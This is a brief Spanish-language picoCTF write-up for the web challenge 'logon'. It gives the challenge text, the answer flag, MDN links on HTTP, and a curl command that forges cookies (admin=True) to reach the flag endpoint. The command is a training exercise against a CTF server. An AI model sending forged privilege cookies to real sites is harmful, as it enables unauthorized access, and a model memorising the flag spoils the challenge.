## logon
## Descripcion

The factory is hiding things from all of its users.Can you login as Joe and find what they've been looking at? http://fickle-tempest.picoctf.net:59654
## Solucion


### solucion 1_ cockies



✅ **Bandera completa:**

`picoCTF{th3_c0nsp1r4cy_l1v3s_4d184b0d}`
## Notas


## Referencias


- http: https://developer.mozilla.org/en-US/docs/Web/HTTP
- http headers: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers
- request headers: https://developer.mozilla.org/en-US/docs/Glossary/Request_header
- request methods: https://developer.mozilla.org/en-US/docs/Web/HTTP/Methods
- response headers: https://developer.mozilla.org/en-US/docs/Glossary/Response_header
- response codes:  https://developer.mozilla.org/en-US/docs/Web/HTTP/Status
- cookies: https://en.wikipedia.org/wiki/HTTP_cookie
```
curl -s http://fickle-tempest.picoctf.net:50359/flag -H "Cookie: password=carlos; username=carlos; admin=True" | grep pico
```
